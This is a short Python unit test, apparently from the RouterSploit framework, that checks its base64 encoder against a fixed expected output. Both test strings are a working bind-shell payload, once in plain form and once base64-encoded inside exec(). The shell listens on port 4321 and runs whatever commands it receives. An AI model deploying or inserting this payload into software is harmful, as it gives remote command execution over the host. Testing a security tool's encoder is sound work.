from routersploit.modules.encoders.python.base64 import Encoder


# python bind tcp payload with rport=4321
bind_tcp = (
    "import socket,os\n" +
    "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
    "so.bind(('0.0.0.0',4321))\n" +
    "so.listen(1)\n" +
    "so,addr=so.accept()\n" +
    "x=False\n" +
    "while not x:\n" +
    "\tdata=so.recv(1024)\n" +
    "\tstdin,stdout,stderr,=os.popen3(data)\n" +
    "\tstdout_value=stdout.read()+stderr.read()\n" +
    "\tso.send(stdout_value)\n"
)

# python bind tcp payload with rport=4321 encoded with python/base64
bind_tcp_encoded = (
    "exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJzAuMC4wLjAnLDQzMjEpKQpzby5saXN0ZW4oMSkKc28sYWRkcj1zby5hY2NlcHQoKQp4PUZhbHNlCndoaWxlIG5vdCB4OgoJZGF0YT1zby5yZWN2KDEwMjQpCglzdGRpbixzdGRvdXQsc3RkZXJyLD1vcy5wb3BlbjMoZGF0YSkKCXN0ZG91dF92YWx1ZT1zdGRvdXQucmVhZCgpK3N0ZGVyci5yZWFkKCkKCXNvLnNlbmQoc3Rkb3V0X3ZhbHVlKQo='.decode('base64'))"
)


def test_payload_enconding():
    """ Test scenario - payload encoding """

    encoder = Encoder()
    assert encoder.encode(bind_tcp) == bind_tcp_encoded
